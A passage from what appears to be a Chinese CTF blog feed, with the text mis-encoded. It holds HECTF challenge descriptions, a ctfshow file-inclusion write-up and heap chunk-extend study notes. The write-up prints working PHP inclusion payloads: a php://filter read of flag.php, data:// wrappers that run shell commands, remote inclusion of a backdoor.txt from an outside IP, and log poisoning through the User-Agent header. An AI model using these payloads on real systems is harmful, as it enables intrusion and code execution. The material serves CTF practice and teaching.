æ°´è¾¹åå­—}   HECTF</p></blockquote><h3 id="ç®€å•çš„å‹ç¼©åŒ…-3"><a class="markdownIt-Anchor" href="#ç®€å•çš„å‹ç¼©åŒ…-3">#</a> <strong>ç®€å•çš„å‹ç¼©åŒ…</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>w41tm00n æ˜¯ä¸ª kisaki æ¨ï¼ŒæŸå¤©åœ¨æ°´ç¾¤çš„æ—¶å€™ï¼Œä¸€ä¸ªåŒä¸º kisaki æ¨çš„ g01den åœ¨ç¾¤é‡Œåˆ†äº«äº†ä¸ªå‹ç¼©åŒ…ï¼Œå¹¶ç•™è¨€é‡Œé¢æœ‰ä¸€å¼  kisaki çš„å›¾ï¼ŒåŒæ—¶é‡Œé¢è¿˜å­˜åœ¨ç€ç¥ç§˜çš„ä¿¡æ¯ï¼ˆè¿™é‡Œæ˜¯ flagï¼‰ï¼Œw41tm00n å¯¹æ­¤å¾ˆæ„Ÿå…´è¶£ï¼Œä½ å¯ä»¥å¸®ä»–å¾—åˆ°ç¥ç§˜çš„ä¿¡æ¯ï¼ˆflagï¼‰å—ï¼Ÿ</p></blockquote><h3 id="æ¶åŠ¿åŠ›çš„ä»“åº“-2"><a class="markdownIt-Anchor" href="#æ¶åŠ¿åŠ›çš„ä»“åº“-2">#</a> <strong>æ¶åŠ¿åŠ›çš„ä»“åº“</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>æ¶åŠ¿åŠ›çš„ä»“åº“æƒ¨é­æ¯’æ‰‹ï¼Œå°±ä»£è¡¨ç€æ¯’æ‰‹ä¼¸è¿›äº†æ¶åŠ¿åŠ›çš„ä»“åº“</p></blockquote><h3 id="æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•-2"><a class="markdownIt-Anchor" href="#æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•-2">#</a> <strong>æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>é™„ä»¶ä¸‹è½½åœ°å€ï¼š é“¾æ¥ï¼š<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWJHRXFnclJncVo2MVU4VHhBRDdxTkE=">https://pan.baidu.com/s/1bGEqgrRgqZ61U8TxAD7qNA</span>  æå–ç ï¼šo07y</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTFerçš„æ¯”èµ›ä¹‹è·¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-æ–‡ä»¶åŒ…å«</title>
      <link href="/posts/ad175165.html"/>
      <url>/posts/ad175165.html</url>
      
        <content type="html"><![CDATA[<p>ç«äº‰åŒ…å«å…ˆä¸å†™äº†ï¼Œæœ‰æ—¶é—´å†å†™ã€‚</p><h1 id="web78"><a class="markdownIt-Anchor" href="#web78">#</a> Web78</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¸¸è§„æ–‡ä»¶åŒ…å«ï¼Œç›´æ¥è¯» flag.phpï¼Œfilter ä¼ªåè®®ï¼š</p><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p></blockquote><h1 id="web79"><a class="markdownIt-Anchor" href="#web79">#</a> Web79ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™æ¬¡æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œå¸¦äº†ä¸ª str_replace æ›¿æ¢ï¼Œæ‰€ä»¥è¯»æ–‡ä»¶ä¼°è®¡å±é™©ï¼Œæ‰“ä¸€æ‰“å¦å¤–çš„æ“ä½œ</p><blockquote><p>?file=data://text/plain,<?=`tac f*`;?></p></blockquote><h1 id="web80"><a class="markdownIt-Anchor" href="#web80">#</a> Web80ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•ä¸€"><a class="markdownIt-Anchor" href="#è§£æ³•ä¸€">#</a> è§£æ³•ä¸€ï¼š</h2><p>â€‹è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œç›´æ¥åœ¨æœåŠ¡å™¨ä¸Šå†™ä¸€ä¸ª txt æ–‡ä»¶ï¼Œä¹‹å http åè®®åŒ…å«å³å¯ã€‚</p><blockquote><p>?file=http://39.107.158.17/backdoor.txt</p></blockquote><h2 id="è§£æ³•äºŒ"><a class="markdownIt-Anchor" href="#è§£æ³•äºŒ">#</a> è§£æ³•äºŒï¼š</h2><p>â€‹åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼š</p><p>â€‹é€šè¿‡ burp æŠ“åŒ…ï¼Œæ”¹ user-agentï¼Œåœ¨å…¶åé¢åŠ ä¸€ä¸ª php ä»£ç ï¼Œæ¯”å¦‚ phpinfoï¼Œ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>204e30c6-d77b-4e30-8694-5a79d576baf9.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0 &lt;?php phpinfo();?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>cross-site</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"><span class="attribute">Te</span><span class="punctuation">: </span>trailers</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè®¿é—®ï¼Ÿfile=/var/log/nginx/access.log è¿™ä¸ªæ–‡ä»¶å³å¯ã€‚</p><h1 id="web81"><a class="markdownIt-Anchor" href="#web81">#</a> Web81</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œæ—¥å¿—æ–‡ä»¶åŒ…å«ï¼Ÿfile=/var/log/nginx/access.log è¿™ä¸ªæ–‡ä»¶ã€‚</p><h1 id="web88"><a class="markdownIt-Anchor" href="#web88">#</a> Web88ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ²¡æœ‰è¿‡æ»¤å†’å·ï¼Œè±†å·ï¼Œæ–œæ å’Œåˆ†å·ï¼Œdata åè®®æ‰“ base64ï¼Œå»æ‰æœ«å°¾çš„ç­‰å·ï¼š</p><blockquote><p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Webç‹—çš„è‡ªæˆ‘å®‰æ…° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ12ï¼‰--Chunk Extend and Overlapping</title>
      <link href="/posts/d1a08bca.html"/>
      <url>/posts/d1a08bca.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwnå­¦ä¹ ç¬”è®°12chunk-extend-and-overlapping"><a class="markdownIt-Anchor" href="#pwnå­¦ä¹ ç¬”è®°12chunk-extend-and-overlapping">#</a> pwn å­¦ä¹ ç¬”è®°ï¼ˆ12ï¼‰â€“Chunk Extend and Overlapping</h1><p>â€‹chunk extend æ˜¯å †æ¼æ´çš„ä¸€ç§å¸¸è§åˆ©ç”¨æ‰‹æ³•ï¼Œé€šè¿‡ extend å¯ä»¥å®ç° chunk overlappingï¼ˆå—é‡å ï¼‰ çš„æ•ˆæœã€‚è¿™ç§åˆ©ç”¨æ–¹æ³•éœ€è¦ä»¥ä¸‹çš„æ—¶æœºå’Œæ¡ä»¶ï¼š</p><ul><li>ç¨‹åºä¸­å­˜åœ¨åŸºäºå †çš„æ¼æ´</li><li>æ¼æ´å¯ä»¥æ§åˆ¶ chunk header ä¸­çš„æ•°æ®</li></ul><h2 id="1-å¯¹inuseçš„fastbinè¿›è¡Œextend"><a class="markdownIt-Anchor" href="#1-å¯¹inuseçš„fastbinè¿›è¡Œextend">#</a> 1ã€å¯¹ inuse çš„ fastbin è¿›è¡Œ extendï¼š</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬ä¸€ä¸ª0x10çš„chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„sizeåŸŸ</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// å®ç° extendï¼Œæ§åˆ¶äº†ç¬¬äºŒä¸ªå—çš„å†…å®¹</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆè¿›è¡Œä¸¤æ¬¡ mallocï¼Œä¹‹åçœ‹çœ‹ heap çš„çŠ¶æ€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">In file: /mnt/hgfs/sharedict/ChunkExtend/extend.c</span><br><span class="line">    3     void *ptr,*ptr1;</span><br><span class="line">    4 </span><br><span class="line">    5     ptr=malloc(0x10);//åˆ†é…ç¬¬ä¸€ä¸ª0x10çš„chunk</span><br><span class="line">    6     malloc(0x10);//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk</span><br><span class="line">    7 </span><br><span class="line"> â–º  8     *(long long *)((long long)ptr-0x8)=0x41;// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„sizeåŸŸ</span><br><span class="line">    9 </span><br><span class="line">   10     free(ptr);</span><br><span class="line">   11     ptr1=malloc(0x30);// å®ç° extendï¼Œæ§åˆ¶äº†ç¬¬äºŒä¸ªå—çš„å†…å®¹</span><br><span class="line">   12     return 0;</span><br><span class="line">   13 &#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp 0x7fffffffde30 â€”â–¸ 0x555555758010 â—‚â€” 0x0</span><br><span class="line">01:0008â”‚     0x7fffffffde38 â—‚â€” 0x0</span><br><span class="line">02:0010â”‚ rbp 0x7fffffffde40 â€”â–¸ 0x5555555546e0 (__libc_csu_init) â—‚â€” push   r15</span><br><span class="line">03:0018â”‚     0x7fffffffde48 â€”â–¸ 0x7ffff7a2d840 (__libc_start_main+240) â—‚â€” mov    edi, eax</span><br><span class="line">04:0020â”‚     0x7fffffffde50 â—‚â€” 0x1</span><br><span class="line">05:0028â”‚     0x7fffffffde58 â€”â–¸ 0x7fffffffdf28 â€”â–¸ 0x7fffffffe2ac â—‚â€” &#x27;/mnt/hgfs/sharedict/ChunkExtend/test&#x27;</span><br><span class="line">06:0030â”‚     0x7fffffffde60 â—‚â€” 0x1f7ffcca0</span><br><span class="line">07:0038â”‚     0x7fffffffde68 â€”â–¸ 0x55555555468a (main) â—‚â€” push   rbp</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f 0   0x5555555546aa main+32</span><br><span class="line">   f 1   0x7ffff7a2d840 __libc_start_main+240</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x20fc1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹æœ‰åœ°å€çš„è¯ï¼Œå°±å»è¯»ä¸€ä¸‹ä¸¤ä¸ªå †çš„å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000021&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000020fc1&lt;======Top Chunk</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¸‹ä¸€æ­¥å¼€å§‹é‡Šæ”¾ï¼Œçœ‹ä¸€çœ‹ä¿®æ”¹ chunk1 çš„ size åŸŸå¤§å°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x20fc1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>â€‹å‘ç° chunk2 è¢«ä¿®æ”¹åå¢å¤§äº†çš„ chunk1 ç»™é‚£å äº†ï¼Œheap é‡Œå°±åªæœ‰ä¸€ä¸ª Chunk äº†ï¼Œçœ‹çœ‹å†…å­˜ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000041&lt;======åŸChunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021&lt;======åŸChunk2</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000020fc1&lt;======Top Chunk</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹é™¤å» chunk1 çš„ size åŸŸå˜åŒ–äº†ä»¥å¤–ï¼Œä¼¼ä¹æ²¡æœ‰å…¶ä»–å˜åŒ–ï¼Œä½†æ˜¯ï¼Œé€»è¾‘ä¸Šæ¥è¯´ï¼Œç°åœ¨çš„å †é‡Œåªæœ‰ä¸€ä¸ª chunk äº†ï¼Œä¹‹å free æ‰ chunk1 çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span 